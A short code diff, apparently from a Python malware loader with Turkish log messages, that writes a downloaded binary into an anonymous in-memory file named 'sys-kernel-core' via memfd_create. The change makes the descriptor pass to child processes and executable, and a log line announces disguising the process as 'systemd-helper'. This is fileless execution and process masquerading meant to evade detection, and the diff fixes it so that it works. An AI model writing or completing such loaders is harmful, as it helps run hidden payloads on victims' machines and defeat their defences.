@@ -42,8 +42,10 @@ def execution_logic():
         log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
         log_to_console("RAM disk alanı (memfd) oluşturuluyor...")
         
-        fd = libc.syscall(319, b"sys-kernel-core", 1)
+        # memfd_create: syscall 319, flags = 0 (MFD_CLOEXEC yok, child sürece geçer)
+        fd = libc.syscall(319, b"sys-kernel-core", 0)
         os.write(fd, binary_content)
+        os.fchmod(fd, 0o755)  # Çalıştırma izni ver
         mem_path = f"/proc/self/fd/{fd}"
         
         log_to_console("Süreç maskeleniyor: systemd-helper")
